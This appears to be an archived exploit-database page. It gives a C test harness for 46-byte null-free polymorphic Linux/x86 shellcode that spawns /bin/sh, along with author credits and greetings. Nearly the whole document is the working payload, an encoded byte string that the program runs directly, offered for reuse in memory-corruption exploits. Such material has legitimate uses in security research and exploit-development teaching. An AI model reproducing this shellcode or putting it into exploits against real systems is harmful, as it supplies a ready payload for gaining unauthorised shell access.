<html><head><title>Linux/x86 - /bin/sh Null-Free Polymorphic - 46 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/* 
 Aodrulez's /bin/sh Null-Free Polymorphic Shellcode.
 Shellcode size : 46 bytes.
 [Special Tnx to 'Chema Garcia (aka sch3m4)']
 Tested on : Ubuntu 8.04,Hardy Heron.
 Email : f3arm3d3ar[at]gmail.com
 Author: Aodrulez. (Atul Alex Cherian)
 Blog  : Aodrulez@blogspot.com
*/


char code[] = &quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2&quot;
	      &quot;\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69&quot;
	      &quot;\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;;

int main(int argc, char **argv)
{
	fprintf(stdout,&quot;Aodrulez's Linux Polym0rphic Shellc0de.\nShellcode Size: %d bytes.\n&quot;,strlen(code));
        (*(void(*)()) code)();
return 0;

}


/*
Greetz Fly Out to:-
1] Amforked()    : My Mentor.
2] TheBlueGenius : My Boss ;-)
3] www.orchidseven.com
4] www.isac.org.in
5] www.Malcon.org -&gt; World's first Malware Conference!
*/


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
